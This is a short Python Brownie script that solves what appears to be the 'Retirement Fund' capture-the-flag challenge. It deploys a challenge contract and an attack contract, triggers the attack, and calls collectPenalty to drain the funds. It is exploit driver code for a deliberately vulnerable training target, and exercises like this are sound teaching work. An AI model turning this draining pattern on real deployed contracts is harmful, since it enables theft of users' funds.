import math
from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    RetirementFundChallenge,
    RetirementFundAttack,
)
from scripts.helpful_scripts import (
    get_account,
    get_contract_address,
    check_solution,
)
from web3 import Web3


def main():
    player = get_account()
    owner = get_account(index=1)
    challenge_contract = RetirementFundChallenge.deploy(player, {"from": owner, "value": Web3.toWei(1, "ether")})
    
    attack_contract = RetirementFundAttack.deploy(challenge_contract, {"from": player, "value": Web3.toWei(1, "wei")})
    tx = attack_contract.attack({"from": player})
    tx.wait(1)
    tx = challenge_contract.collectPenalty({"from": player})
    tx.wait(1)

    check_solution(challenge_contract.address)